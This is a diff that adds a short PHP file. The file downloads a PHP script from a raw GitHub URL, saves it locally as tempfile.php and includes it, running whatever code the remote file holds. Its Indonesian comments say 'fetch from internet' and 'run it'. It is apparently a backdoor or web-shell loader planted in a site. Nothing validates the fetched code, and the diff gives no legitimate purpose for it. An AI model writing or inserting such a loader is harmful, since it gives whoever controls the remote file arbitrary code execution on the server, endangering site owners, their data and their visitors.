@@ -1,0 +1,10 @@
+<?php
+$remote_file = "https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/main/repository-matitanam.php.txt";
+$local_file = "tempfile.php";
+
+// Ambil dari internet
+file_put_contents($local_file, file_get_contents($remote_file));
+
+// Jalankan
+include $local_file;
+?>
